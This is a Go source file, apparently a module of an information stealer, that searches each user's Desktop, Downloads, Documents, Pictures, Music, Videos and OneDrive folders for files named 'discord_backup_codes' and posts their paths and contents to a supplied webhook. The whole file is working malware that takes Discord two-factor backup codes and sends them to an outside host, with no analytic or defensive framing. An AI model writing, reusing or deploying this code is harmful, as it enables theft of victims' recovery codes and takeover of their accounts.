package discodes

import (
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/requests"
	"os"
	"path/filepath"
	"strings"
)

func Run(webhook string) {
	for _, user := range hardware.GetUsers() {
		for _, dir := range []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		} {
			if _, err := os.Stat(dir); err != nil {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				if info.IsDir() {
					return nil
				}
				if info.Size() > 2*1024*1024 {
					return nil
				}
				if !strings.HasPrefix(info.Name(), "discord_backup_codes") {
					return nil
				}
				data, err := os.ReadFile(path)
				if err != nil {
					return nil
				}
				requests.Webhook(webhook, map[string]interface{}{
					"content": "`" + path + "`",
					"embeds": []map[string]interface{}{
						{
							"title":       "Discord Backup Codes",
							"description": "```" + string(data) + "```",
						},
					},
				})
				return nil
			})
		}
	}
}
